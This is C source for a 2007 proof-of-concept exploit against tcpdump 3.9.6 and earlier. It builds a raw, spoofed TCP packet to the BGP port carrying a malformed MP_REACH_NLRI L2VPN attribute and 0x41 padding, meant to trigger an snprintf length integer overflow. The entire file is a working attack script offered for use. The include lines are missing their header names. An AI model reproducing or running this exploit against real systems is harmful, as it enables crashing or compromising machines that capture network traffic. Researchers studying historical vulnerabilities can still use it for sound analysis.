/\* tcpdump-bgp.c
\*
\* Copyright (c) 2007 by
\*
\* tcpdump <= 3.9.6 BGP UPDATE remote overflow POC (lnx)
\* by mu-b - July 2007
\*
\* $Id: tcpdump-bgp.c 11 2012-08-16 14:22:37Z mu-b $
\*
\* - Tested on: tcpdump-3.9.6 (.tar.gz)
\*
\* simple snprintf length integer overflow...
\*
\* http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
\*/
#include
#include
#define \_\_FAVOR\_BSD
#include
#include
#include
#include
#include
#include
#include
#include
#define TH\_PUSH 0x08
#define PORT\_BGP 179
#define PKT\_LEN 512
#define BGPTYPE\_MP\_REACH\_NLRI 14
#define AFNUM\_L2VPN 196
#define SAFNUM\_VPNUNICAST 128
static unsigned short
ip\_sum (const unsigned short \*ptr, int len)
{
register int sum = 0;
while (len > 1)
{
sum += \*ptr++;
len -= 2;
}
if (len == 1)
sum += \*((unsigned char \*) ptr);
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
return (~sum);
}
int
main (void)
{
int raw\_fd, opt\_val, \*popt\_val;
char buf[4096], \*ptr;
struct ip \*iph;
struct tcphdr \*tcph;
struct sockaddr\_in sin;
printf ("tcpdump <= 3.9.6 BGP UPDATE remote overflow POC\n"
"by mu-b \n"
"http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
if ((raw\_fd = socket (PF\_INET, SOCK\_RAW, IPPROTO\_TCP)) < 0)
{
perror ("socket ()");
exit (EXIT\_FAILURE);
}
opt\_val = 1;
popt\_val = &opt\_val;
if (setsockopt (raw\_fd, IPPROTO\_IP, IP\_HDRINCL, popt\_val, sizeof opt\_val) < 0)
{
perror ("setsockopt ()");
exit (EXIT\_FAILURE);
}
sin.sin\_family = AF\_INET;
sin.sin\_port = htons (PORT\_BGP);
sin.sin\_addr.s\_addr = inet\_addr ("127.0.0.1");
memset (buf, 0, 4096);
iph = (struct ip \*) buf;
iph->ip\_hl = 5;
iph->ip\_v = 4;
iph->ip\_tos = 0;
iph->ip\_len = htons (sizeof (struct ip) + sizeof (struct tcphdr) + PKT\_LEN);
iph->ip\_id = htonl (54321);
iph->ip\_off = 0;
iph->ip\_ttl = 255;
iph->ip\_p = 6;
iph->ip\_sum = 0;
iph->ip\_src.s\_addr = inet\_addr ("1.2.3.4");
iph->ip\_dst.s\_addr = sin.sin\_addr.s\_addr;
iph->ip\_sum = ip\_sum ((unsigned short \*) buf, sizeof (struct ip));
tcph = (struct tcphdr \*) (buf + sizeof (struct ip));
tcph->th\_sport = htons (65535);
tcph->th\_dport = htons (PORT\_BGP);
tcph->th\_seq = rand ();
tcph->th\_ack = 0;
tcph->th\_x2 = 0;
tcph->th\_off = sizeof (struct tcphdr) / 4;
tcph->th\_flags = TH\_PUSH;
tcph->th\_win = htonl (65535);
tcph->th\_sum = 0;
tcph->th\_urp = 0;
ptr = buf + sizeof (struct ip) + sizeof (struct tcphdr);
memset (ptr, 0xFF, 16); /\* marker \*/
ptr += 16;
\*ptr++ = 0x02; /\* length \*/
\*ptr++ = 0x00;
\*ptr++ = 0x02; /\* type = BGP\_UPDATE \*/
\*ptr++ = 0x00; /\* length \*/
\*ptr++ = 0x00;
\*ptr++ = 0x00; /\* length \*/
\*ptr++ = 0xFF;
\*ptr++ = 0x00; /\* attr flags \*/
\*ptr++ = BGPTYPE\_MP\_REACH\_NLRI; /\* attr type \*/
\*ptr++ = 0xFF; /\* attr length \*/
\*ptr++ = (AFNUM\_L2VPN << 8) & 0xFF;
\*ptr++ = AFNUM\_L2VPN & 0xFF;
\*ptr++ = SAFNUM\_VPNUNICAST;
\*ptr++ = 0x00; /\* Next-HOP \*/
\*ptr++ = 0x00; /\* SNPA \*/
/\* decode\_labeled\_vpn\_l2 \*/
\*ptr++ = 0xFF; /\* tlen = plen \*/
\*ptr++ = 0xFF;
memset (ptr, 0xFF, 15); /\* marker \*/
ptr += 15;
\*ptr++ = 0x01; /\* type \*/
\*ptr++ = 0x04; /\* len \*/
\*ptr++ = 0x50;
memset (ptr, 0x41, PKT\_LEN);
if (sendto (raw\_fd, buf, sizeof (struct ip) + sizeof (struct tcphdr) + PKT\_LEN, 0,
(struct sockaddr \*) &sin, sizeof (sin)) < 0)
{
perror ("sendto ()");
exit (EXIT\_FAILURE);
}
return (EXIT\_SUCCESS);
}
